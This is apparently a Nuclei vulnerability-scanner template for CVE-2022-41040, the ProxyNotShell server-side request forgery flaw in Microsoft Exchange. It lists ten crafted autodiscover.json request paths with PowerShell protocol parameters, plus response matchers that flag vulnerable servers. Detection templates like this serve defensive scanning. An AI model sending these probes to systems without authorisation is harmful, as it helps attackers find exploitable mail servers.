id: CVE-2022-41040

info:
  name: Microsoft Exchange Server Server-Side Request Forgery Vulnerability
  author: Phillipo
  severity: high
  description: Microsoft Exchange Server Elevation of Privilege Vulnerability.
  reference:
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-41040
    - http://packetstormsecurity.com/files/170066/Microsoft-Exchange-ProxyNotShell-Remote-Code-Execution.html
    - https://hackerone.com/reports/1719719
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-918
    cve-id: CVE-2022-41040
  tags: cve,cve2022,kev,microsoft

http:
  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@{{Host}}?Protocol=Autodiscoverv1"
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa..{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a..{{Host}}&Protocol=Autodiscoverv1&Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a@{{Host}}&Protocol=Autodiscoverv1&Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa..{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a..{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa@{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a@{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa..{{Host}}/owa/?&Email=aa@autodiscover/autodiscover.json?a..{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa@{{Host}}/owa/?&Email=aa@autodiscover/autodiscover.json?a@{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa..{{Host}}/owa/?&Email=aa@autodiscover/autodiscover.json?a..{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@{{Host}}&Protocol=Autodiscoverv1&Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?@{{Host}}/&Email=autodiscover/autodiscover.json%3f@{{Host}}"
    redirects: false
    matchers:
      - type: status
        status:
          - 404
      - type: word
        part: body
        words: 
          - 'IIS Web Core'
    matchers-condition: and
